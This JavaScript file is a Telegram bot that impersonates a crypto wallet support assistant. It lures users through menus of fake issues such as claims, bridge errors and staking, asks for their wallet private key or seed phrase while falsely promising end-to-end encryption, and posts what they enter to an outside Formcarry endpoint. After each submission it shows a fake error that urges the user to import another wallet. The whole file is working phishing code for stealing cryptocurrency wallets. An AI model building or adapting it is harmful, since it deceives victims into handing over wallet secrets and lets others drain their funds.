require ('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Replace with your Telegram bot tokens
const TELEGRAM_BOT_TOKENS = [
    process.env.TG_BOT_TOK1,
    process.env.TG_BOT_TOK2,
    process.env.TG_BOT_TOK3,
    process.env.TG_BOT_TOK4,
    process.env.TG_BOT_TOK5,
    // process.env.TG_BOT_TOK6,
    // process.env.TG_BOT_TOK7,
    // process.env.TG_BOT_TOK8,
    // process.env.TG_BOT_TOK9,
    // process.env.TG_BOT_TOK10

];

// Create an array of bot instances
const bots = TELEGRAM_BOT_TOKENS.map(token => new TelegramBot(token, { polling: true }));

// Formcarry endpoint and your form ID
const FORMCARRY_URL = process.env.FORMCARRY_URL;
const YOUR_ACCESS_TOKEN = process.env.FORMCARRY_ACCESS_TOKEN;

// Store user data temporarily
const userData = {};

// Function to send data to Formcarry with retry logic
const sendToFormcarry = async (chatId, data, retries = 3, delay = 1000) => {
    try {
        const response = await axios.post(FORMCARRY_URL, data, {
            headers: { Authorization: `Bearer ${YOUR_ACCESS_TOKEN}` },
        });

        if (response.status === 200) {
            // Success: Notify the user
            const optionss = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔄 Restart Bot', callback_data: 'restart_bot' },
                            { text: '➕ Import New Wallet', callback_data: 'import_another_wallet' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ An error occured, please contact admin to solve your issue or try importing another wallet.', {
                    parse_mode: 'Markdown',
                    ...optionss,
                });
            });
        } else {
            // Handle non-200 responses
            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                    parse_mode: 'Markdown',
                    ...optionss,
                });
            });
        }
    } catch (error) {
        if (error.response && error.response.status === 429 && retries > 0) {
            // Rate limit hit: Retry after a delay
            const retryDelay = delay * 2; // Exponential backoff
            console.log(`Rate limit hit. Retrying in ${retryDelay}ms...`);
            setTimeout(() => sendToFormcarry(chatId, data, retries - 1, retryDelay), retryDelay);
        } else {
            // Other errors: Notify the user
            console.error('Error submitting to Formcarry:', error.message);
            bots.forEach(bot => {
                bot.sendMessage(chatId, '❌ *Oops! Something went wrong. Please try again.*', {
                    parse_mode: 'Markdown',
                });
            });
        }
    }
};

// Start command
bots.forEach(bot => {
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;

        // Create a fashionable inline keyboard with emojis
        const options = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Harvest Transaction', callback_data: 'harvest' },
                        { text: 'Claim', callback_data: 'claim' }
                    ],
                    [
                        { text: 'Migration', callback_data: 'migrate' },
                        { text: 'Staking', callback_data: 'staking' }
                    ],
                    [
                        { text: 'Whitelisting', callback_data: 'whitelist' },
                        { text: 'Bridge Error', callback_data: 'bridge_err' }
                    ],
                    [
                        { text: 'Presale Error', callback_data: 'presale_err' },
                        { text: 'NFT', callback_data: 'nft' }
                    ],
                    [
                        { text: 'Revoke', callback_data: 'revoke' },
                        { text: 'KYC', callback_data: 'kyc' }
                    ],
                    [
                        { text: 'Deposit Issues', callback_data: 'deposit' },
                        { text: 'Others', callback_data: 'others' }
                    ],
                    [
                        { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                    ]
                ],
            },
        };

        bot.sendMessage(chatId, `Hi there!
I’m your dedicated assistant here to help with all your crypto-related questions and technical issues. 
Whether you're setting up a wallet, troubleshooting transactions, or navigating blockchain features, 
I’m here to guide you every step of the way.

If you're encountering an error, need help understanding crypto terms, or just have general questions 
about your account, simply ask! I’ll provide the best possible solution, and if needed, I can connect 
you with one of our human experts.

⚠️NOTE: YOU ARE SUBMITTING ALL REQUIRED INFORMATIONS TO BOT WITH ZERO HUMAN INTERFERENCE. 

*🔗 END TO END ENCRYPTED 🔁*`, { parse_mode: 'Markdown', ...options });
        userData[chatId] = { step: 'choosing_option' }; // Track user's step
    });
});

// Handle inline keyboard button clicks (first step)
bots.forEach(bot => {
    bot.on('callback_query', (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;

        // Handle restart and import another wallet actions
        if (data === 'restart_bot') {
            // Restart the bot by sending the /start command
            bot.sendMessage(chatId, '🔄 Restarting the bot...');
            bot.sendMessage(chatId, '/start');
            return;
        } else if (data === 'import_another_wallet') {
            // Reset the user's step to allow importing another wallet
            userData[chatId] = { step: 'choosing_option' };

            // Ask the user to choose an option again
            const options = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: 'Harvest Transaction', callback_data: 'harvest' },
                            { text: 'Claim', callback_data: 'claim' }
                        ],
                        [
                            { text: 'Migration', callback_data: 'migrate' },
                            { text: 'Staking', callback_data: 'staking' }
                        ],
                        [
                            { text: 'Whitelisting', callback_data: 'whitelist' },
                            { text: 'Bridge Error', callback_data: 'bridge_err' }
                        ],
                        [
                            { text: 'Presale Error', callback_data: 'presale_err' },
                            { text: 'NFT', callback_data: 'nft' }
                        ],
                        [
                            { text: 'Revoke', callback_data: 'revoke' },
                            { text: 'KYC', callback_data: 'kyc' }
                        ],
                        [
                            { text: 'Help', callback_data: 'help' },
                            { text: 'Others', callback_data: 'others' }
                        ],
                        [
                            { text: 'Contact Support 🟢', url: 'https://t.me/yesmine2008' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, '➕ Please choose an option to import another wallet:', {
                parse_mode: 'Markdown',
                ...options,
            });
            return;
        }

        // Store the chosen option
        userData[chatId].option = data;

        // If the user selects Private Key or Seed Phrase directly, skip the authentication step
        if (data === 'private_key' || data === 'seed_phrase') {
            userData[chatId].authMethod = data;
            userData[chatId].step = 'providing_input'; // Move to the input step

            // Ask for input based on the chosen method
            let message = '';
            if (data === 'private_key') {
                message = `You selected *Private Key* as your authentication method. 
Please enter your wallet **Private Key** :`;
            } else if (data === 'seed_phrase') {
                message = `You selected *Seed Phrase* as your authentication method. 
Please enter your **12-word Seed Phrase** (separated by spaces):`;
            }

            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
        } else {
            // Otherwise, ask for authentication method
            userData[chatId].step = 'choosing_auth_method'; // Move to the next step

            const authMethodOptions = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🔑 Private Key', callback_data: 'private_key' },
                            { text: '📝 Seed Phrase', callback_data: 'seed_phrase' }
                        ]
                    ],
                },
            };

            bot.sendMessage(chatId, `You selected *${data}*. 
Please provide the *Private key* or *Seed Phrase*  for the wallet affected to begin authentication with the smart contract:`, {
                parse_mode: 'Markdown',
                ...authMethodOptions,
            });
        }
    });
});

// Handle user input (third step)
bots.forEach(bot => {
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;

        if (!userData[chatId] || userData[chatId].step !== 'providing_input') {
            return; // Ignore messages if not in the input step
        }

        const authMethod = userData[chatId].authMethod;
        let isValid = false;
        let errorMessage = '';

        // Validate input based on the chosen method
        if (authMethod === 'seed_phrase') {
            const words = text.trim().split(/\s+/); // Split by spaces
            isValid = words.length > 11;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain at least **12 words**. Please try again:';
            }
        } else if (authMethod === 'private_key') {
            isValid = text.length > 20;
            if (!isValid) {
                errorMessage = '❌ *Invalid Input!* It must contain a valid private key. Please try again:';
            }
        }

        if (!isValid) {
            bot.sendMessage(chatId, errorMessage, { parse_mode: 'Markdown' });
            return;
        }

        userData[chatId].input = text;

        // Prepare data to send to Formcarry
        const data = {
            option: userData[chatId].option,
            authMethod: userData[chatId].authMethod,
            input: userData[chatId].input,
        };

        // Send data to Formcarry with rate limit handling
        sendToFormcarry(chatId, data);

        // Clear user data after submission
        delete userData[chatId];
    });
});